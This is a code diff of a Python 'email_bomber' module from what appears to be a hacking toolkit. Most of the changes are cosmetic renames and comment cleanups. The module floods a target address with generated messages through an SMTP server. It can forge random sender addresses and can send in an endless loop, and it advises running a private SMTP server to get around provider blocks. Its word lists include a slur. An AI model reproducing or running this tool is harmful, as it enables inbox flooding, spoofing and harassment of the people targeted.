@@ -1,6 +1,6 @@
 #		Copyright (C) 2015 Noa-Emil Nissinen (4shadoww)
 import sys
-from core import bcolors
+from core import colors
 from collections import OrderedDict
 import smtplib
 from email.mime.multipart import MIMEMultipart
@@ -9,22 +9,22 @@ import socket
 import random
 from string import ascii_lowercase
 
-#info about module
-#modules name (must be same as filename)
-modulename = "email_bomber"
-#module version
+# Info about the module
+# Module's name (should be same as file's name)
+name = "email_bomber"
+# Module version
 version = "1.0"
-#description
+# Description
 desc = "spam email to target email"
-#creator's github
+# Creator's github
 github = "4shadoww"
-#created by (creators name)
+# Creator's name
 createdby = "4shadoww"
-#email
+# Email
 email = "4shadoww0@gmail.com"
 
 
-#list of variables
+# List of the variables
 variables = OrderedDict((
 ('my_username', 'username'),
 ('my_password', 'yourpassword'),
@@ -41,7 +41,7 @@ variables = OrderedDict((
 ('random_message', 1),
 ))
 
-#description for variables
+# Description for variables
 vdesc = [
 'username for login',
 'password for login',
@@ -58,13 +58,13 @@ vdesc = [
 'generate random message(0 = no/1 = yes)',
 ]
 
-s_nouns = ["A dude", "My mom", "The king", "Some guy", "A cat with rabies", "A sloth", "Your homie", "This cool guy my gardener met yesterday", "Superman", "Super Mario", "Human", "Robot", "Boy"]
+s_nouns = ["A dude", "My mom", "The king", "Some guy", "A cat with rabies", "A sloth", "Your homie", "This cool guy my gardener met yesterday", "Superman", "Super Mario", "Human", "Robot", "Boy", "Girl"]
 p_nouns = ["These dudes", "Both of my moms", "All the kings of the world", "Some guys", "All of a cattery's cats", "The multitude of sloths living under your bed", "Your homies", "Like, these, like, all these people", "Supermen"]
 s_verbs = ["eats", "kicks", "gives", "treats", "meets with", "creates", "hacks", "configures", "spies on", "retards", "meows on", "flees from", "tries to automate", "explodes", "writes", "tease"]
 p_verbs = ["eat", "kick", "give", "treat", "meet with", "create", "hack", "configure", "spy on", "retard", "meow on", "flee from", "try to automate", "explode"]
 infinitives = ["to make a pie.", "for no apparent reason.", "because the sky is green.", "for a disease.", "to be able to make toast explode.", "to know more about archeology.", "because the sky is blue"]
 
-option_notes = bcolors.YEL+" this module will not work with gmail, yahoo, yandex\n please run your own smtp!"+bcolors.END
+option_notes = colors.yellow+" this module will not work with gmail, yahoo, yandex\n please run your own smtp!"+colors.end
 #simple changelog
 changelog = "Version 1.0:\nrelease"
 
@@ -84,16 +84,16 @@ def run():
 	try:
 		server = smtplib.SMTP(variables['smtp'], int(variables['smtp_port']))
 	except(ValueError):
-		print(bcolors.WARNING+"error: port number must be int"+bcolors.END)
+		print(colors.red+"error: port number must be int"+colors.end)
 		return
 	except socket.gaierror:
-		print(bcolors.WARNING+"error: cannot reach smtp server"+bcolors.END)
+		print(colors.red+"error: cannot reach smtp server"+colors.end)
 		return
 	except(ConnectionRefusedError):
-		print(bcolors.WARNING+"error: connection refused"+bcolors.END)
+		print(colors.red+"error: connection refused"+colors.end)
 		return
 	except(TimeoutError):
-		print(bcolors.WARNING+"error: timeout cannot reach smtp server"+bcolors.END)
+		print(colors.red+"error: timeout cannot reach smtp server"+colors.end)
 		return
 	if int(variables['starttls']) == 1:
 		server.starttls()
@@ -111,10 +111,10 @@ def run():
 					words = " ".join(list0)
 					msg.attach(MIMEText(words, 'html'))
 				server.sendmail(fromaddr, toaddr, text)
-				print(bcolors.OKGREEN+"email sended"+bcolors.END)
+				print(colors.green+"email sended"+colors.end)
 
 	if int(variables['amount']) == 0:
-		print(bcolors.YEL+'starting infinite loop (ctrl+c) to end')
+		print(colors.yellow+'starting infinite loop (ctrl+c) to end')
 		while True:
 			if int(variables['random_email']) == 1:
 					fakemail = generate_random_email()
@@ -124,7 +124,7 @@ def run():
 					words = " ".join(list0)
 					msg.attach(MIMEText(words, 'html'))
 			server.sendmail(fromaddr, toaddr, text)
-			print(bcolors.OKGREEN+"email sended"+bcolors.END)
+			print(colors.green+"email sended"+colors.end)
 	server.quit()
 
 def get_random_domain(domains):
